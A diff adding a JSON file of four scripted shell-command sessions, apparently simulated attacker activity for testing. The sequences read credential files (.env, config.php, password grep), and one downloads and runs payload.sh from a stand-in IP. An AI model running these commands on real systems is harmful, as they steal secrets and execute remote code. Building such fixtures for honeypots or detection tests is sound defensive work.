@@ -1,0 +1,6 @@
+[
+  ["whoami", "pwd", "ls -la", "cat .env", "exit"],
+  ["uname -a", "id", "ps aux", "netstat -tulpn", "exit"],
+  ["cd /tmp", "wget http://198.51.100.7/payload.sh", "chmod +x payload.sh", "./payload.sh", "exit"],
+  ["ls", "cat config.php", "find / -name '*.env'", "grep -R password /var/www/html", "exit"]
+]
